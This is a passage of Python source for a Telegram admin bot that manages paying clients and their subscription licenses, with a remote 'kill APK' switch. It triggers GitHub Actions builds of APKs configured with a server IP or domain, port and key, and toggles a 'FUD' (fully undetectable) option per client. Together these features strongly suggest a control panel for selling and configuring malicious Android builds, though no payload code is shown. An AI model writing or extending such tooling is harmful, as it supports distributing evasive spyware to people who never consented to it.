@bot.message_handler(
    func=lambda m: edit_client_buf.get(str(m.chat.id)) is not None)
def handle_edit_client_input(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = edit_client_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    text   = message.text.strip()
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass

    field     = buf.get("field")
    client_id = buf.get("client_id")
    error     = ""
    db        = get_db()
    c         = db.execute(
        "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    db.close()
    if not c:
        edit_client_buf.pop(chat_id, None)
        safe_edit(message.chat.id, msg_id, "❌ Client not found.", kb_home_only())
        return

    import re as _re
    if field == "name":
        new_val = "" if text == "." else text
        db = get_db()
        db.execute("UPDATE clients SET profile_name=? WHERE id=?",
                   (new_val, client_id))
        db.commit()
        db.close()

    elif field == "username":
        clean = text.lstrip("@").strip()
        if not clean:
            error = "Username cannot be empty."
        else:
            # Duplicate check (exclude self)
            db = get_db()
            existing = db.execute(
                "SELECT id FROM clients WHERE telegram_username=? AND id!=?",
                (clean, client_id)).fetchone()
            db.close()
            if existing:
                error = f"@{clean} is already used by another client."
            else:
                db = get_db()
                db.execute("UPDATE clients SET telegram_username=? WHERE id=?",
                           (clean, client_id))
                db.commit()
                db.close()

    elif field == "tg_id":
        if not text.strip().lstrip("-").isdigit():
            error = "Telegram ID must be numeric."
        else:
            db = get_db()
            existing = db.execute(
                "SELECT id FROM clients WHERE telegram_id=? AND id!=?",
                (text.strip(), client_id)).fetchone()
            db.close()
            if existing:
                error = "This Telegram ID is already used by another client."
            else:
                db = get_db()
                db.execute("UPDATE clients SET telegram_id=? WHERE id=?",
                           (text.strip(), client_id))
                db.commit()
                db.close()

    elif field == "rdp_ip":
        if not _re.match(r"^\d{1,3}(\.\d{1,3}){3}$", text.strip()):
            error = "Invalid IP format. Example: 192.168.1.100"
        else:
            db = get_db()
            db.execute("UPDATE clients SET rdp_ip=? WHERE id=?",
                       (text.strip(), client_id))
            db.commit()
            db.close()

    if error:
        # Re-fetch current values and re-show same field with error
        db = get_db()
        c  = db.execute(
            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        db.close()
        safe_edit(message.chat.id, msg_id,
                  text_edit_client_field(dict(c), field, error=error),
                  kb_edit_client_cancel(client_id))
        return

    # Success — clear buf, reload fresh client, go back to edit menu
    edit_client_buf.pop(chat_id, None)
    db = get_db()
    c  = db.execute(
        "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    db.close()
    safe_edit(message.chat.id, msg_id,
              f"✅ <b>Saved</b>\n"
              f"━━━━━━━━━━━━━━━━━━━━\n"
              + text_edit_client_menu(dict(c)),
              kb_edit_client_menu(client_id))


@bot.message_handler(
    func=lambda m: add_client_buf.get(str(m.chat.id)) is not None)
def handle_add_client_input(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = add_client_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    text   = message.text.strip()
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass

    field  = buf.get("field")
    data   = buf.get("data", {})
    error  = ""

    if field == "name":
        if not text.strip():
            error = "Profile name cannot be empty."
        else:
            data["name"] = text.strip()
            buf["field"] = "tg_id"

    elif field == "tg_id":
        if not text.strip().lstrip("-").isdigit():
            error = "Telegram ID must be numeric (e.g. 123456789)."
        else:
            data["tg_id"] = text.strip()
            buf["field"]  = "rdp_ip"

    elif field == "rdp_ip":
        import re as _re
        ip_pattern = r"^\d{1,3}(\.\d{1,3}){3}$"
        if not _re.match(ip_pattern, text.strip()):
            error = "Invalid IP format. Example: 192.168.1.100"
        else:
            data["rdp_ip"] = text.strip()
            buf["field"]   = "username"

    elif field == "username":
        clean = text.lstrip("@").strip()
        if text.strip() == ".":
            data["username"] = ""
            buf["field"]     = "confirm"
        elif not clean:
            error = "Send a username or send  .  to skip."
        else:
            # Duplicate check
            db = get_db()
            existing = db.execute(
                "SELECT id FROM clients WHERE telegram_username=?",
                (clean,)).fetchone()
            db.close()
            if existing:
                error = f"Client @{clean} already exists."
            else:
                data["username"] = clean
                buf["field"]     = "confirm"

    buf["data"]              = data
    add_client_buf[chat_id]  = buf

    if error:
        # Re-show same field with error message
        safe_edit(message.chat.id, msg_id,
                  text_add_client_form(data, field, error=error),
                  kb_add_client_cancel())
        return

    if buf["field"] == "confirm":
        token = generate_client_token(data["username"])
        db    = get_db()
        try:
            db.execute(
                "INSERT INTO clients "
                "(telegram_username, profile_name, telegram_id, "
                "rdp_ip, token) VALUES (?,?,?,?,?)",
                (data["username"], data.get("name", ""),
                 data["tg_id"], data["rdp_ip"], token)
            )
            db.commit()
        except Exception as e:
            db.close()
            add_client_buf.pop(chat_id, None)
            safe_edit(message.chat.id, msg_id,
                      f"❌ Failed to add client: {e}", kb_home_only())
            return
        db.close()
        add_client_buf.pop(chat_id, None)
        display_name = data.get("name") or f"@{data['username']}"
        safe_edit(
            message.chat.id, msg_id,
            f"✅ <b>Client Added</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Name     : {display_name}\n"
            f"🔗 Username : @{data['username']}\n"
            f"🆔 TG ID    : <code>{data['tg_id']}</code>\n"
            f"🖥 RDP IP   : <code>{data['rdp_ip']}</code>\n"
            f"🔑 Token    : <code>{token}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━",
            kb_back_home()
        )
        return

    safe_edit(message.chat.id, msg_id,
              text_add_client_form(data, buf["field"]),
              kb_add_client_cancel())


@bot.callback_query_handler(func=lambda c: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    msg_id  = call.message.message_id
    data    = call.data

    bot.answer_callback_query(call.id)

    if not is_admin(chat_id):
        return

    if data == "noop":
        return

    if not session_valid(chat_id):
        # Layer 3: Check lockout before showing PIN
        locked, mins = is_locked_out(chat_id)
        if locked:
            kb_unlock_cb = types.InlineKeyboardMarkup()
            if str(chat_id) not in _unlock_blocked:
                kb_unlock_cb.add(types.InlineKeyboardButton(
                    "🔓 Unlock", callback_data="do_unlock"))
            safe_edit(
                chat_id, msg_id,
                f"🔒 <b>Too many failed attempts.</b>\n"
                f"Locked for {mins} more minute(s).",
                kb_unlock_cb,
            )
            return
        pin_buffer[str(chat_id)] = ""
        nav_state[str(chat_id)]  = {
            "screen": "pin", "message_id": msg_id}
        safe_edit(
            chat_id, msg_id,
            "⏰ <b>Session expired.</b> Please login again.\n\n"
            + text_pin(""),
            kb_pin()
        )
        return

    # ── Navigation ────────────────────────────────────────────────────────────
    if data == "nav_home":
        custom_build_buf.pop(str(chat_id), None)
        server_config_buf.pop(str(chat_id), None)
        show_main(chat_id, msg_id)

    elif data == "nav_clients":
        edit_client_buf.pop(str(chat_id), None)
        add_client_buf.pop(str(chat_id), None)
        show_clients(chat_id, msg_id)

    elif data == "nav_server":
        safe_edit(chat_id, msg_id, text_server_status(), kb_server())

    elif data == "server_logs":
        try:
            import subprocess
            result = subprocess.run(
                ["journalctl", "-u", "vaultguard_telegram", "-n", "50",
                 "--no-pager", "--output=short"],
                capture_output=True, text=True, timeout=10
            )
            log_text = result.stdout.strip() or "(no log output)"
        except Exception as e:
            log_text = f"(error reading logs: {e})"
        # Truncate to fit Telegram 4096 char limit
        max_len = 3800
        if len(log_text) > max_len:
            log_text = "…" + log_text[-max_len:]
        safe_edit(chat_id, msg_id,
                  f"📋 <b>Bot Logs (last 50 lines)</b>\n"
                  f"━━━━━━━━━━━━━━━━━━━━\n"
                  f"<code>{log_text}</code>",
                  kb_server())

    elif data == "server_tunnel":
        try:
            import subprocess
            result = subprocess.run(
                ["journalctl", "-u", "vaultguard_cloudflare", "-n", "20",
                 "--no-pager", "--output=short"],
                capture_output=True, text=True, timeout=10
            )
            lines = result.stdout.strip().splitlines()
            # Find trycloudflare URL
            tunnel_url = next(
                (ln for ln in reversed(lines) if "trycloudflare.com" in ln or ".cfargotunnel.com" in ln),
                None
            )
        except Exception:
            tunnel_url = None
        if tunnel_url:
            safe_edit(chat_id, msg_id,
                      f"🔗 <b>Tunnel URL</b>\n"
                      f"━━━━━━━━━━━━━━━━━━━━\n"
                      f"<code>{tunnel_url.strip()}</code>",
                      kb_server())
        else:
            safe_edit(chat_id, msg_id,
                      "🔗 <b>Tunnel URL</b>\n"
                      "━━━━━━━━━━━━━━━━━━━━\n"
                      "⚠️ No active tunnel URL found.\n"
                      "Check Cloudflare service status.",
                      kb_server())

    elif data == "server_restart":
        safe_edit(chat_id, msg_id,
                  "♻️ <b>Restart Bot</b>\n"
                  "━━━━━━━━━━━━━━━━━━━━\n"
                  "⏳ Restarting vaultguard_telegram service…",
                  kb_back_home())
        try:
            ok = restart_service("vaultguard_telegram")
            if ok:
                safe_edit(chat_id, msg_id,
                          "♻️ <b>Restart Bot</b>\n"
                          "━━━━━━━━━━━━━━━━━━━━\n"
                          "✅ Bot service restarted successfully.\n"
                          "🔄 Reconnecting…",
                          kb_back_home())
            else:
                safe_edit(chat_id, msg_id,
                          "♻️ <b>Restart Bot</b>\n"
                          "━━━━━━━━━━━━━━━━━━━━\n"
                          "❌ Restart failed. Check service logs.",
                          kb_server())
        except Exception as e:
            safe_edit(chat_id, msg_id,
                      f"♻️ <b>Restart Bot</b>\n"
                      f"━━━━━━━━━━━━━━━━━━━━\n"
                      f"❌ Error: <code>{e}</code>",
                      kb_server())

    elif data == "server_force_sync":
        safe_edit(chat_id, msg_id,
                  "⬇️ <b>Force Sync</b>\n"
                  "━━━━━━━━━━━━━━━━━━━━\n"
                  "⏳ Syncing from GitHub main…\n\n"
                  "Step 1 — Fetching latest code\n"
                  "Step 2 — Backing up config.py\n"
                  "Step 3 — Hard reset to origin/main\n"
                  "Step 4 — Restoring config.py\n"
                  "Step 5 — Restarting bot service",
                  kb_back_home())
        def _do_force_sync():
            try:
                changed = force_sync()
                if changed:
                    files_str = "\n".join(
                        f"  📄 <code>{f}</code>" for f in changed[:10])
                    if len(changed) > 10:
                        files_str += f"\n  ...and {len(changed) - 10} more"
                    result_text = (
                        "⬇️ <b>Force Sync — Done ✅</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        f"📦 {len(changed)} file(s) updated:\n"
                        f"{files_str}\n"
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        "♻️ Restarting bot service…"
                    )
                    safe_edit(chat_id, msg_id, result_text, kb_back_home())
                    time.sleep(1)
                    restart_service("vaultguard_telegram")
                else:
                    safe_edit(chat_id, msg_id,
                              "⬇️ <b>Force Sync — Done ✅</b>\n"
                              "━━━━━━━━━━━━━━━━━━━━\n"
                              "✅ Already up to date with GitHub main.\n"
                              "No files changed.",
                              kb_server())
            except Exception as e:
                safe_edit(chat_id, msg_id,
                          f"⬇️ <b>Force Sync — Failed ❌</b>\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n"
                          f"Error: <code>{e}</code>",
                          kb_server())
        threading.Thread(target=_do_force_sync, daemon=True).start()

    elif data == "nav_stats":
        safe_edit(chat_id, msg_id, text_global_stats(), kb_back_home())

    elif data == "nav_settings":
        safe_edit(chat_id, msg_id, text_settings(chat_id), kb_settings())

    elif data == "nav_build":
        safe_edit(chat_id, msg_id,
                  "🏗 <b>Build Control</b>\n"
                  "━━━━━━━━━━━━━━━━━━━━\n"
                  "Use the bot to trigger builds via GitHub Actions.",
                  kb_build())

    elif data == "add_client":
        add_client_buf[str(chat_id)] = {"field": "name", "data": {}}
        nav_state[str(chat_id)] = {"screen": "add_client",
                                   "message_id": msg_id}
        safe_edit(chat_id, msg_id,
                  text_add_client_form({}, "name"),
                  kb_add_client_cancel())

    elif data.startswith("client_") and not data.startswith("client_stats_"):
        show_client_detail(chat_id, msg_id, int(data.split("_")[1]))

    elif data.startswith("edit_client_"):
        # Show edit menu — all fields with current values
        client_id = int(data.split("_")[2])
        edit_client_buf.pop(str(chat_id), None)   # clear any pending edit
        db = get_db()
        c  = db.execute(
            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        db.close()
        if not c:
            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
            return
        safe_edit(chat_id, msg_id,
                  text_edit_client_menu(dict(c)),
                  kb_edit_client_menu(client_id))

    elif data.startswith("editfield_"):
        # editfield_{client_id}_{field}
        parts     = data.split("_", 2)
        client_id = int(parts[1])
        field     = parts[2]
        db = get_db()
        c  = db.execute(
            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        db.close()
        if not c:
            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
            return
        edit_client_buf[str(chat_id)] = {
            "field":     field,
            "client_id": client_id,
        }
        nav_state[str(chat_id)] = {"screen": "edit_client", "message_id": msg_id}
        safe_edit(chat_id, msg_id,
                  text_edit_client_field(dict(c), field),
                  kb_edit_client_cancel(client_id))

    elif data.startswith("toggle_client_"):
        # Flip active ↔ inactive
        client_id = int(data.split("_")[2])
        db  = get_db()
        c   = db.execute(
            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        if not c:
            db.close()
            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
            return
        new_active = 0 if c["active"] else 1
        db.execute("UPDATE clients SET active=? WHERE id=?",
                   (new_active, client_id))
        db.commit()
        db.close()
        # Reload fresh data
        db = get_db()
        c  = db.execute(
            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        db.close()
        status_word = "Activated 🟢" if new_active else "Deactivated 🔴"
        safe_edit(chat_id, msg_id,
                  f"✅ <b>{status_word}</b>\n"
                  f"━━━━━━━━━━━━━━━━━━━━\n"
                  + text_client_detail(dict(c)),
                  kb_client_detail(client_id, active=bool(new_active),
                                   vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
                                   killed=int(c["killed"] if "killed" in c.keys() else 0),
                                   expire_ts=int(c["expire_ts"] if "expire_ts" in c.keys() else 0)))

    elif data == "do_unlock":
        # Emergency unlock: set nav_state to awaiting_unlock so the next
        # message is handled by handle_unlock_password
        cid_str = str(chat_id)
        if cid_str in _unlock_blocked:
            # Silently ignore — too many wrong master passwords
            return
        nav_state[cid_str] = {"screen": "awaiting_unlock", "message_id": msg_id}
        safe_edit(
            chat_id, msg_id,
            "🔐 <b>Emergency Unlock</b>\n\n"
            "Enter the master password to clear the lockout:"
        )
        return

    elif data.startswith("toggle_fud_"):
        client_id = int(data.split("_")[2])
        db        = get_db()
        c         = db.execute(
            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        if not c:
            db.close()
            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
            return
        new_bypass = 0 if c["vpn_bypass"] else 1
        db.execute("UPDATE clients SET vpn_bypass=? WHERE id=?",
                   (new_bypass, client_id))
        db.commit()
        db.close()
        # Reload fresh data
        db = get_db()
        c  = db.execute(
            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        db.close()
        fud_word = "ON 🟢" if new_bypass else "OFF 🔴"
        safe_edit(chat_id, msg_id,
                  f"✅ <b>FUD {fud_word}</b>\n"
                  f"━━━━━━━━━━━━━━━━━━━━\n"
                  + text_client_detail(dict(c)),
                  kb_client_detail(client_id, active=bool(c["active"]),
                                   vpn_bypass=new_bypass,
                                   killed=int(c["killed"] if "killed" in c.keys() else 0),
                                   expire_ts=int(c["expire_ts"] if "expire_ts" in c.keys() else 0)))

    elif data.startswith("kill_apk_"):
        # Toggle killed flag — kills or revives the APK license
        client_id = int(data.split("_")[2])
        db        = get_db()
        c         = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        if not c:
            db.close()
            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
            return
        new_killed = 0 if int(c["killed"] if "killed" in c.keys() else 0) else 1
        db.execute("UPDATE clients SET killed=? WHERE id=?", (new_killed, client_id))
        db.commit()
        db.close()
        db  = get_db()
        c   = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        db.close()
        action_word = "💀 APK Killed" if new_killed else "✅ APK Revived"
        safe_edit(chat_id, msg_id,
                  f"<b>{action_word}</b>\n"
                  f"━━━━━━━━━━━━━━━━━━━━\n"
                  + text_client_detail(dict(c)),
                  kb_client_detail(client_id,
                                   active=bool(c["active"]),
                                   vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
                                   killed=new_killed,
                                   expire_ts=int(c["expire_ts"] if "expire_ts" in c.keys() else 0)))

    elif data.startswith("renew_license_"):
        # Extend subscription by 30 days from now (or from current expire_ts if in future)
        client_id = int(data.split("_")[2])
        db        = get_db()
        c         = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        if not c:
            db.close()
            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
            return
        now_ts       = int(time.time())
        cur_expire   = int(c["expire_ts"] if "expire_ts" in c.keys() else 0) or 0
        # Extend from current expiry if it's in the future, else extend from now
        base         = cur_expire if cur_expire > now_ts else now_ts
        new_expire   = base + (30 * 86400)  # +30 days
        db.execute("UPDATE clients SET expire_ts=?, killed=0 WHERE id=?", (new_expire, client_id))
        db.commit()
        db.close()
        db  = get_db()
        c   = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        db.close()
        exp_str = datetime.fromtimestamp(new_expire, tz=timezone.utc).strftime("%d %b %Y")
        safe_edit(chat_id, msg_id,
                  f"✅ <b>License Renewed</b>\n"
                  f"━━━━━━━━━━━━━━━━━━━━\n"
                  f"New expiry: <b>{exp_str}</b>\n"
                  f"━━━━━━━━━━━━━━━━━━━━\n"
                  + text_client_detail(dict(c)),
                  kb_client_detail(client_id,
                                   active=bool(c["active"]),
                                   vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
                                   killed=0,
                                   expire_ts=new_expire))

    elif data.startswith("set_expire_"):
        # Prompt operator to type new expiry date
        client_id = int(data.split("_")[2])
        db        = get_db()
        c         = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        db.close()
        if not c:
            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
            return
        name = c["profile_name"] or c["telegram_username"]
        # Store context so next text message sets the expiry date
        nav_state[str(chat_id)] = {
            "screen":     "set_expire",
            "client_id":  client_id,
            "message_id": msg_id,
        }
        safe_edit(chat_id, msg_id,
                  f"⏰ <b>Set Expiry — {name}</b>\n"
                  "━━━━━━━━━━━━━━━━━━━━\n"
                  "Reply with expiry date:\n"
                  "<code>DD/MM/YYYY</code>  or  <code>DD-MM-YYYY</code>\n\n"
                  "Example: <code>31/12/2026</code>\n\n"
                  "Or reply <code>0</code> to remove expiry (no time limit).",
                  types.InlineKeyboardMarkup().add(
                      types.InlineKeyboardButton("🔙 Cancel", callback_data=f"client_{client_id}")))

    elif data.startswith("delete_client_"):
        client_id = int(data.split("_")[2])
        db        = get_db()
        c         = db.execute(
            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        builds_cnt = db.execute(
            "SELECT COUNT(*) as cnt FROM builds WHERE client_id=?",
            (client_id,)).fetchone()["cnt"] if c else 0
        db.close()
        name = c["profile_name"] or c["telegram_username"] if c else "Unknown"
        safe_edit(
            chat_id, msg_id,
            f"🗑 <b>Delete Client — {name}</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ This will deactivate <b>{name}</b>.\n"
            f"📦 {builds_cnt} build(s) will be unlinked.\n"
            f"📱 All linked devices will be detached.\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "This action cannot be undone. Continue?",
            kb_delete_confirm(client_id)
        )

    elif data.startswith("confirm_delete_"):
        client_id = int(data.split("_")[2])
        db        = get_db()
        try:
            # builds.client_id is NOT NULL — cannot be set to NULL.
            # Delete builds for this client; devices can be nulled (no NOT NULL constraint).
            db.execute("DELETE FROM devices WHERE client_id=?", (client_id,))
            db.execute("DELETE FROM builds  WHERE client_id=?", (client_id,))
            db.execute("DELETE FROM clients WHERE id=?", (client_id,))
            db.commit()
            clients = [dict(c) for c in db.execute(
                "SELECT * FROM clients ORDER BY id DESC").fetchall()]
        finally:
            db.close()
        try:
            bot.edit_message_text("🗑 Client deleted.", chat_id, msg_id, parse_mode="HTML")
        except Exception:
            pass
        safe_edit(chat_id, msg_id, text_clients(clients), kb_clients(clients))

    elif data.startswith("new_build_"):
        custom_build_buf.pop(str(chat_id), None)
        server_config_buf.pop(str(chat_id), None)
        client_id = int(data.split("_")[2])
        safe_edit(chat_id, msg_id,
                  text_template_select(client_id),
                  kb_template_select(client_id))

    elif data.startswith("quick_rebuild_"):
        # quick_rebuild_{client_id}_{template}
        # Fired from the Rebuild button attached directly to the APK document message.
        # The document message cannot be edited — send a NEW message and use that as nav target.
        rest      = data[len("quick_rebuild_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        # Check last build config
        _db = get_db()
        _c  = _db.execute("SELECT rdp_ip FROM clients WHERE id=?", (client_id,)).fetchone()
        _lb = _db.execute(
            "SELECT server_ip, server_port, server_key FROM builds "
            "WHERE client_id=? AND template=? "
            "ORDER BY id DESC LIMIT 1",
            (client_id, template)).fetchone()
        _db.close()
        _rdp_ip = _c["rdp_ip"] if _c else ""
        if _lb and _lb["server_ip"] and _lb["server_port"] and _lb["server_key"]:
            # All 3 values available — send new message with pre-filled confirm screen
            new_msg = bot.send_message(
                chat_id,
                text_rebuild_confirm(client_id, template),
                parse_mode="HTML",
                reply_markup=kb_quick_rebuild_confirm(client_id, template)
            )
            nav_state[str(chat_id)] = {"screen": "rebuild_confirm", "message_id": new_msg.message_id}
        else:
            # Missing port/key — send new message, start port entry
            new_msg = bot.send_message(
                chat_id,
                f"🔁 <b>Rebuild — enter port & key</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📡 IP already set: <code>{_rdp_ip}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🔌 Enter server port:\n\n"
                f"<i>Example: 7771</i>",
                parse_mode="HTML",
                reply_markup=kb_server_config_cancel(client_id, template)
            )
            server_config_buf[str(chat_id)] = {
                "step":       "port",
                "client_id":  client_id,
                "template":   template,
                "ip":         _rdp_ip,
                "port":       None,
                "key":        None,
                "is_rebuild": True,
            }
            nav_state[str(chat_id)] = {"screen": "server_config", "message_id": new_msg.message_id}

    elif data.startswith("quick_cancel_build_"):
        # quick_cancel_build_{client_id}
        # Fired from the Cancel Build button on the APK document message.
        # Cancels the most recent in-progress GitHub Actions run for this client.
        rest      = data[len("quick_cancel_build_"):]
        client_id = int(rest.split("_")[0]) if "_" in rest else int(rest)
        run_id    = prod_active_run.get(str(chat_id))
        if not run_id:
            bot.answer_callback_query(call.id, "⚠️ No active build to cancel.", show_alert=False)
        else:
            resp = requests.delete(
                f"{GH_REPO()}/actions/runs/{run_id}/cancel",
                headers=GH_HEADERS(),
                timeout=10,
            )
            if resp.status_code in (202, 204):
                bot.answer_callback_query(call.id, "🛑 Build cancelled.", show_alert=False)
                prod_active_run.pop(str(chat_id), None)
            elif resp.status_code == 409:
                bot.answer_callback_query(call.id, "✅ Build already completed.", show_alert=False)
            else:
                bot.answer_callback_query(call.id, f"⚠️ Cancel failed ({resp.status_code}).", show_alert=False)

    elif data.startswith("srv_host_ip_"):
        # srv_host_ip_{client_id}_{template} — admin chose IP Address path
        rest      = data[len("srv_host_ip_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        buf = server_config_buf.get(str(chat_id))
        if not buf:
            safe_edit(chat_id, msg_id, "❌ Session expired. Please start again.", kb_build())
            return
        _cfg = buf.get("_companion_cfg") or read_companion_server_config()
        buf["host_type"] = "ip"
        buf["step"]      = "ip"
        server_config_buf[str(chat_id)] = buf
        safe_edit(chat_id, msg_id,
                  text_server_ip_prompt(client_id, template, cfg=_cfg),
                  kb_server_config_ip(client_id, template, _cfg.get("ip", "")))

    elif data.startswith("srv_host_domain_"):
        # srv_host_domain_{client_id}_{template} — admin chose Domain Name path
        rest      = data[len("srv_host_domain_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        buf = server_config_buf.get(str(chat_id))
        if not buf:
            safe_edit(chat_id, msg_id, "❌ Session expired. Please start again.", kb_build())
            return
        _cfg = buf.get("_companion_cfg") or read_companion_server_config()
        buf["host_type"] = "domain"
        buf["step"]      = "domain"
        server_config_buf[str(chat_id)] = buf
        safe_edit(chat_id, msg_id,
                  text_server_domain_prompt(cfg=_cfg),
                  kb_server_domain(client_id, template))

    elif data.startswith("srv_back_to_host_type_"):
        # srv_back_to_host_type_{client_id}_{template} — back from domain input → host type
        rest      = data[len("srv_back_to_host_type_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        buf = server_config_buf.get(str(chat_id))
        if not buf:
            safe_edit(chat_id, msg_id, "❌ Session expired. Please start again.", kb_build())
            return
        _cfg = buf.get("_companion_cfg") or read_companion_server_config()
        buf["step"]      = "host_type"
        buf["host_type"] = None
        buf["ip"]        = None
        server_config_buf[str(chat_id)] = buf
        safe_edit(chat_id, msg_id,
                  text_server_host_type_prompt(client_id, template, cfg=_cfg),
                  kb_server_host_type(client_id, template))

    elif data.startswith("srv_keep_ip_"):
        # srv_keep_ip_{client_id}_{template} — keep current IP, move to port
        rest      = data[len("srv_keep_ip_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        buf = server_config_buf.get(str(chat_id))
        if not buf:
            safe_edit(chat_id, msg_id, "❌ Session expired. Please start again.", kb_build())
            return
        _cfg = buf.get("_companion_cfg") or read_companion_server_config()
        buf["ip"]   = _cfg.get("ip") or ""
        buf["step"] = "port"
        server_config_buf[str(chat_id)] = buf
        safe_edit(chat_id, msg_id,
                  text_server_port_prompt(buf["ip"], cfg=_cfg),
                  kb_server_config_port(client_id, template, _cfg.get("port", "")))

    elif data.startswith("srv_keep_port_"):
        # srv_keep_port_{client_id}_{template} — keep current port, move to key
        rest      = data[len("srv_keep_port_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        buf = server_config_buf.get(str(chat_id))
        if not buf:
            safe_edit(chat_id, msg_id, "❌ Session expired. Please start again.", kb_build())
            return
        _cfg = buf.get("_companion_cfg") or read_companion_server_config()
        buf["port"] = _cfg.get("port") or ""
        buf["step"] = "key"
        server_config_buf[str(chat_id)] = buf
        safe_edit(chat_id, msg_id,
                  text_server_key_prompt(buf["ip"], buf["port"], cfg=_cfg),
                  kb_server_config_key(client_id, template, _cfg.get("key", "")))

    elif data.startswith("srv_keep_key_"):
        # srv_keep_key_{client_id}_{template} — keep current key, go to confirm
        rest      = data[len("srv_keep_key_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        buf = server_config_buf.get(str(chat_id))
        if not buf:
            safe_edit(chat_id, msg_id, "❌ Session expired. Please start again.", kb_build())
            return
        _cfg = buf.get("_companion_cfg") or read_companion_server_config()
        buf["key"]  = _cfg.get("key") or ""
        buf["step"] = "done"
        server_config_buf[str(chat_id)] = buf
        # Build diff block and show confirm screen
        _old_ip, _old_port, _old_key = _cfg.get("ip","—"), _cfg.get("port","—"), _cfg.get("key","—")
        _new_ip, _new_port, _new_key = buf["ip"], buf["port"], buf["key"]
        def _diff_srv(old, new):
            return f"<code>{new}</code> (unchanged)" if old == new else f"<del>{old}</del> → <code>{new}</code>"
        _host_label_srv = "🌐 Host" if is_domain(_new_ip) else "📡 IP  "
        _diff_block = (
            "🔄 <b>Config Update:</b>\n"
            f"   {_host_label_srv} : {_diff_srv(_old_ip,   _new_ip)}\n"
            f"   🔌 Port : {_diff_srv(_old_port, _new_port)}\n"
            f"   🔑 Key  : {_diff_srv(_old_key,  _new_key)}\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
        )
        is_rebuild = buf.get("is_rebuild", False)
        cbuf = custom_build_buf.get(str(chat_id))
        if template == "custom" and cbuf:
            safe_edit(chat_id, msg_id,
                      _diff_block + text_custom_build_confirm(client_id, cbuf["app_name"],
                          srv_ip=_new_ip, srv_port=_new_port, srv_key=_new_key),
                      kb_build_confirm(client_id, template))
        elif is_rebuild:
            safe_edit(chat_id, msg_id,
                      f"🔁 <b>Rebuild — confirm config</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                      + _diff_block + "Confirm to rebuild with this config:",
                      kb_rebuild_confirm(client_id, template))
        else:
            safe_edit(chat_id, msg_id,
                      _diff_block + text_build_confirm(client_id, template,
                          srv_ip=_new_ip, srv_port=_new_port, srv_key=_new_key),
                      kb_build_confirm(client_id, template))

    elif data.startswith("srv_back_to_ip_"):
        # srv_back_to_ip_{client_id}_{template} — back from Port screen → IP or Domain screen
        rest      = data[len("srv_back_to_ip_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        buf = server_config_buf.get(str(chat_id))
        if not buf:
            safe_edit(chat_id, msg_id, "❌ Session expired. Please start again.", kb_build())
            return
        _cfg = buf.get("_companion_cfg") or read_companion_server_config()
        buf["ip"]   = None
        server_config_buf[str(chat_id)] = buf
        nav_state[str(chat_id)] = {"screen": "server_config", "message_id": msg_id}
        # Route back to domain screen if domain path was chosen, else IP screen
        if buf.get("host_type") == "domain":
            buf["step"] = "domain"
            server_config_buf[str(chat_id)] = buf
            safe_edit(chat_id, msg_id,
                      text_server_domain_prompt(client_id, template, cfg=_cfg),
                      kb_server_domain(client_id, template))
        else:
            buf["step"] = "ip"
            server_config_buf[str(chat_id)] = buf
            safe_edit(chat_id, msg_id,
                      text_server_ip_prompt(client_id, template, cfg=_cfg),
